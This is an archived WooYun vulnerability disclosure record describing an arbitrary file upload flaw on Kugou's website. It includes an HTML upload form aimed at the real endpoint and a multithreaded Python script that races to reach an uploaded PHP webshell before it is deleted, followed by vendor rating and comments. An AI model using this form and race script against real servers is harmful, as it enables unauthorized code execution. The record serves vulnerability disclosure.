{"id": 88226, "wybug_id": "wooyun-2016-0208816", "wybug_title": "酷狗主站的一处任意文件上传可shell                                      ", "wybug_corp": "酷狗", "wybug_author": "李长歌", "wybug_date": "2016-05-15 10:09", "wybug_open_date": "2016-06-30 10:00", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传内容未检查", "文件上传漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-30：\t细节向公众公开  简要描述： 酷狗主站的一处任意文件上传可shell。 详细说明：  存在任意上传的地址为 http://www.kugou.com/kf/kf/app/upload.php保存html文件然后上传\n<html><body><form action=\"http://www.kugou.com/kf/kf/app/upload.php\" method=\"post\"enctype=\"multipart/form-data\"><label for=\"file\">Filename:</label><input type=\"file\" name=\"imgFile\" id=\"imgFile\" /> <br /><input type=\"submit\" name=\"submit\" value=\"Submit\" /></form></body></html>\n得到一个路径 {\"error\":0,\"url\":\".\\/upload\\/1463241818.php\"}但是我们访问http://www.kugou.com/kf/kf/app/upload/1463241818.php 无法找到网页\n\n上传瞬间 就被删除了。利用条件竞争，在被删除之前生成一个shell，上传之后的路径可以猜测到写个脚本在上传php文件的时候同时进行猜测访问路径\nimport urllib2  import threadingimport timedef request_uri():    uri = 'http://www.kugou.com/kf/kf/app/upload/%s.php' % str(time.time()).split('.')[0]    try:        req = urllib2.Request(uri)        response = urllib2.urlopen(req).read()        print 'except %s' % uri        print response    except Exception, e:        passdef start():    threads = []    for i in xrange(30):        threads.append(threading.Thread(target=request_uri))    for t in threads:        t.start()    for t in threads:        t.join()if __name__=='__main__':    while True:        start()\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  shell已删，修复   版权声明：转载请注明来源 李长歌@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2016-05-16 09:56 厂商回复： 谢谢提交! 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-15 11:04 |    \t\tjackyu \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:18        | 世界上没有一个系统是绝对安全的，系统最大...)\t\t \n  ImageMagickk?    \n     2016-05-15 11:15 |    \t\t李长歌 \t\t\t( 普通白帽子  |\t\t\t        Rank:426 漏洞数:44        | http://www.wooyun.org/)\t\t \n  @jackyu 不是。    \n     2016-05-15 16:49 |    \t\tdr.m1st3r \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:10        | 一个爱泡妞的好骚年。)\t\t \n  mark    \n     2016-05-15 22:34 |    \t\t重瞳 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 我是重瞳)\t\t \n  吊吊吊    \n     2016-05-19 09:32 |    \t\tba1ma0 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | 什么都不会..)\t\t \n  叼叼叼    \n     2016-05-19 09:47 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:780 漏洞数:158        | going)\t\t \n  主站shell也才给个7，好像自己给钱似的    \n     2016-05-19 15:53 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:678 漏洞数:136        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  表哥你真厉害    \n     2016-06-05 10:14 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:678 漏洞数:136        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  666666我还以为这种只有审计能发现的    \n     2016-06-06 09:35 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:780 漏洞数:158        | going)\t\t \n  这也能黑盒。。。。    \n     2016-06-30 10:07 |    \t\t欧尼酱 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:8        | 技术马马虎虎)\t\t \n  6666666    \n     2016-06-30 10:08 |    \t\tMr_Java \t\t\t( 普通白帽子  |\t\t\t        Rank:170 漏洞数:43        | 高三党，当，档，裆！)\t\t \n  这酷狗太不像话了。。。。。。才这点rank    \n     2016-06-30 10:10 |    \t\t大志哥 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:9        | @_@)\t\t \n  主站都getshell了还只有中，7rank    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}